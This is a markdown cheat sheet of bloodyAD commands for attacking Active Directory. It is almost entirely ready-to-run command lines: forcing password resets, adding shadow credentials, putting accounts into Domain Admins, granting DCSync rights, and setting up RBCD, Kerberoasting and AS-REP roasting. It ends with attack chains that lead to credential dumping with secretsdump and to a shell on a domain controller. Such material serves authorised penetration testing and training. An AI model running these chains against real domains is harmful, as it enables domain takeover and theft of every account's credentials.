> **bloodyAD** — An Active Directory privilege escalation and post-exploitation tool.

## Connection Flags

```bash
# Common connection flags (prepend to any command below)
-d DOMAIN.LOCAL -u USERNAME -p PASSWORD --host DC_IP
-d DOMAIN.LOCAL -u USERNAME -p PASSWORD --host DC_IP -s          # Use LDAPS
-d DOMAIN.LOCAL -u USERNAME -k                                   # Kerberos auth (uses ccache)
```

## Commands

```bash
###############################################################################
#                              ENUMERATION
###############################################################################

# Get domain info
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get dnsDump
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get writable --otype ALL --right WRITE
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get search --filter '(objectClass=user)' --attr sAMAccountName
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get search --filter '(objectClass=computer)' --attr dNSHostName
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get search --filter '(objectClass=group)' --attr member

# Get object attributes
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get object 'TARGET_USER' --attr '*'
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get object 'TARGET_USER' --attr userAccountControl
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get object 'TARGET_USER' --attr msDS-AllowedToDelegateTo
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get object 'TARGET_USER' --attr servicePrincipalName

# Get children / membership
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get children 'DC=domain,DC=local' --type user
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP get membership 'TARGET_USER'

###############################################################################
#                          PASSWORD / CREDENTIAL ATTACKS
###############################################################################

# Change a user's password (requires GenericAll / ResetPassword rights)
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP set password 'TARGET_USER' 'NewP@ssw0rd!'

# Shadow Credentials — add msDS-KeyCredentialLink
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add shadowCredentials 'TARGET_USER'
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove shadowCredentials 'TARGET_USER' --key KEY_ID

###############################################################################
#                           GROUP MEMBERSHIP
###############################################################################

# Add user to a group
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add groupMember 'Domain Admins' 'TARGET_USER'

# Remove user from a group
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove groupMember 'Domain Admins' 'TARGET_USER'

###############################################################################
#                        ACL / DACL ABUSE
###############################################################################

# Add GenericAll on a target object
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add genericAll 'OU=TARGET,DC=domain,DC=local' 'ATTACKER_USER'

# Add DCSync rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add dcsync 'ATTACKER_USER'

# Remove DCSync rights
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove dcsync 'ATTACKER_USER'

# Add/remove RBCD (Resource-Based Constrained Delegation)
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add rbcd 'TARGET_COMPUTER$' 'ATTACKER_COMPUTER$'
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove rbcd 'TARGET_COMPUTER$' 'ATTACKER_COMPUTER$'

###############################################################################
#                        COMPUTER ACCOUNT ABUSE
###############################################################################

# Add a computer account to the domain
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add computer 'YOURPC$' 'CompP@ss123!'

# Remove a computer account
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove computer 'YOURPC$'

###############################################################################
#                        UAC MANIPULATION
###############################################################################

# Disable pre-authentication (AS-REP Roast setup)
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add uac 'TARGET_USER' -f DONT_REQ_PREAUTH

# Remove flag
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove uac 'TARGET_USER' -f DONT_REQ_PREAUTH

# Disable account
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add uac 'TARGET_USER' -f ACCOUNTDISABLE

# Enable account
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove uac 'TARGET_USER' -f ACCOUNTDISABLE

# Set TRUSTED_FOR_DELEGATION (unconstrained delegation)
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add uac 'TARGET_COMPUTER$' -f TRUSTED_FOR_DELEGATION

###############################################################################
#                        DNS MANIPULATION
###############################################################################

# Add a DNS record
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add dnsRecord 'RECORD_NAME' 'ATTACKER_IP'

# Remove a DNS record
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP remove dnsRecord 'RECORD_NAME' 'ATTACKER_IP'

###############################################################################
#                     OBJECT ATTRIBUTE MANIPULATION
###############################################################################

# Set an arbitrary attribute
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP set object 'TARGET' --attr ATTRIBUTE --value VALUE

# Set SPN (Kerberoast setup)
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP set object 'TARGET_USER' --attr servicePrincipalName --value 'HTTP/fake.domain.local'

# Set owner of an object
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP set owner 'TARGET_DN' 'ATTACKER_USER'

###############################################################################
#                        COMMON ATTACK CHAINS
###############################################################################

# --- Chain: ForceChangePassword ---
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP set password 'VICTIM' 'Pwned!1234'

# --- Chain: Kerberoast via SPN injection ---
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP set object 'VICTIM' --attr servicePrincipalName --value 'YOURSPN/whatever'
# Then: impacket-GetUserSPNs ...

# --- Chain: RBCD -> S4U -> Shell ---
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add computer 'YOURPC$' 'P@ss1234'
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add rbcd 'TARGET_DC$' 'YOURPC$'
# Then: impacket-getST -spn cifs/TARGET_DC.domain.local ...

# --- Chain: Shadow Credentials -> PKINIT ---
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add shadowCredentials 'VICTIM'
# Then: certipy / PKINITtools to request TGT

# --- Chain: DCSync ---
bloodyAD -d DOMAIN.LOCAL -u user -p pass --host DC_IP add dcsync 'ATTACKER_USER'
# Then: impacket-secretsdump DOMAIN.LOCAL/ATTACKER_USER:pass@DC_IP
```

## Quick Reference — Common UAC Flags

|Flag|Use Case|
|---|---|
|`DONT_REQ_PREAUTH`|AS-REP Roasting|
|`ACCOUNTDISABLE`|Disable/enable accounts|
|`TRUSTED_FOR_DELEGATION`|Unconstrained delegation|
|`TRUSTED_TO_AUTH_FOR_DELEGATION`|Constrained delegation (S4U)|
|`PASSWD_NOTREQD`|Allow empty password|